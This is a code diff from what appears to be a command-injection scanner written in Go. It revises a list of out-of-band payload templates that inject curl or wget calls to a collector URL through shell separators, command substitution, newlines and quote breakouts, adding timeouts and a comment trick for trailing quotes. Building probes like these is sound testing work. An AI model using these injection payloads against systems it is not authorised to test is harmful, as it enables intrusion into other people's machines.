@@ -60,18 +60,20 @@ var payloadFormats = []string{
 // computed-arithmetic payloadFormats above cannot, since they rely on the result
 // being reflected in-band. The separators cover POSIX shells (`;`, `|`, `&&`,
 // newline, `$(...)`, backticks) and Windows cmd (`&`); curl and wget both ship on
-// modern Linux/macOS and curl ships on Windows 10+.
+// modern Linux/macOS and curl ships on Windows 10+. Every fetch carries a short
+// timeout (`-m`/`-T`) so a target whose OS silently blackholes the connection to
+// an unroutable collector can't hang the (sequential) probe for minutes.
 var oobCmdFormats = []string{
-	"; curl -s %s",      // statement separator
-	"| curl -s %s",      // pipe
-	"& curl -s %s",      // background / Windows cmd separator
-	"&& curl -s %s",     // conditional chain
-	"$(curl -s %s)",     // command substitution
-	"`curl -s %s`",      // backtick command substitution
-	"; wget -qO- %s",    // wget fallback where curl is absent
-	"\ncurl -s %s",      // newline injection (also covers direct-exec sinks)
-	"' ; curl -s %s ;",  // break out of single-quoted context
-	"\" ; curl -s %s ;", // break out of double-quoted context
+	"; curl -s -m 3 %s",        // statement separator
+	"| curl -s -m 3 %s",        // pipe
+	"& curl -s -m 3 %s",        // background / Windows cmd separator
+	"&& curl -s -m 3 %s",       // conditional chain
+	"$(curl -s -m 3 %s)",       // command substitution
+	"`curl -s -m 3 %s`",        // backtick command substitution
+	"; wget -qO- -T 3 %s",      // wget fallback where curl is absent
+	"\ncurl -s -m 3 %s",        // newline injection (also covers direct-exec sinks)
+	"' ; curl -s -m 3 %s ; #",  // break out of single-quoted context; # eats the wrapper's trailing quote
+	"\" ; curl -s -m 3 %s ; #", // break out of double-quoted context; # eats the wrapper's trailing quote
 }
 
 // newCanary builds a canary from two random factors. The product is ~9 digits,
